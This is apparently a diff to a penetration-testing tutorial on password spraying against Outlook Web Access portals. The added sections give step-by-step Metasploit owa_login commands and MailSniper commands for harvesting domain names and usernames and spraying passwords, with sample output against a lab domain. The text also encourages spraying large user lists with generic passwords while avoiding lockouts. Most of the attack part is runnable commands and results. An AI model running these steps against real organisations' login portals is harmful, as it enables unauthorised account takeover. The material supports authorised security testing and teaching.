@@ -26,7 +26,7 @@ A domain user is any user in the domain. We of course have to figure out the dom
 
 ### **Step 1 Finding a service to spray**
 
-An OWA portal is very typically located at `mail.example.com` or similar. Any ADFS integrated portal should in theory work since its all the same AD authentication in the back-end. However, certain tools like MailSniper are built for attacking certain parts of the mail portal, so not all functions may work if its not an OWA.
+An OWA portal is very typically located at `mail.example.com` ,`example.com/owa` or similar. Any ADFS integrated portal should in theory work since its all the same AD authentication in the back-end. However, certain tools like MailSniper are built for attacking certain parts of the mail portal, so not all functions may work if its not an OWA.
 
 ### **Step 2 Obtain the domain name**
 
@@ -40,6 +40,16 @@ set password <password>
 exploit
 
 [+] Found target domain: TESTLAB
+```
+
+Alternatively, MailSniper can be used to obtain the domain name using response times.
+
+```text
+Invoke-DomainHarvestOWA -ExchHostname testlab.local -DomainList c:\temp\domainlist.txt -OutFile potential-domains.txt
+
+[*] Harvesting Domain Name from the OWA portal at https://testlab.local/owa/
+...
+[*] Potentially Valid Domain! Domain:TESTLAB
 ```
 
 ### **Step 3 Obtain a valid username or e-mail address**
@@ -69,22 +79,49 @@ exploit
 
 We we're correct about the username syntax and so we got a valid username. Note that this module uses response time to assess the validity of usernames, so you might get false positives here. It can be worth trying a few usernames you know are invalid to verify.
 
-### Step 4: Perform password spraying
+As before we can also use Mailsniper for this task
+
+```text
+Invoke-UsernameHarvestOWA -ExchHostname testlab.corp.local -UserList c:\temp\userlist.txt -Domain TESTLAB -OutFile potential-usernames.txt
+
+[*] Now spraying the OWA portal at https://testlab.local/owa/
+...
+[*] Potentially Valid! User:TESTLAB\bmoney
+```
+
+### Step 4 Perform password spraying
 
 Now when both a domain name and a user name has been acquired we can perform the actual password spraying. The key here is to spray in a controlled manner to prevent lockout. That means to record which users were sprayed, exactly when, what password were tried and how many attempts for each user.
 
 ```text
+use auxiliary/scanner/http/owa_login
+set rhost 10.10.10.10
+set domain TESTLAB
+set username bmoney
+set password ilovemoney
+exploit
 
+[*] 10.10.10.10:443 OWA - Trying bmoney : ilovemoney
+[+] server type: MX01
+[*] 10.10.10.10:443 OWA - FAILED LOGIN, BUT USERNAME IS VALID. 0.224583728 'TESTLAB\bmoney' : 'ilovemoney': SAVING TO CREDS
+[*] Auxiliary module execution completed
 ```
 
 Alternatively the spraying can be performed with MailSniper, where the username is entered into `userlist.txt`
 
 ```text
-Invoke-PasswordSprayOWA -ExchHostname mx01.testlab.l
-ocal -userlist .\userlist.txt -password winter2018
+Invoke-PasswordSprayOWA -ExchHostname testlab.local -userlist .\userlist.txt -password winter2018
+
+[*] Now spraying the OWA portal at https://testlab.local/owa/
+
+[*] SUCCESS! User:bmoney:winter2018
 ```
+
+Hooray! We got a valid password. We did this with one user as example, but don't forget that what we want to do here is to spray a lot of users using generic passwords like winter2018 and hope they stick. The larger the userlist, the greater the chance of success.
 
 ## Domain password spraying
 
 Password spraying is however not only something you can do externally to find domain users. It can be very useful if you have internal access but no domain user, or to get the credentials ofr higher privileged users when nothing else is working.
+
+More coming soon!
 
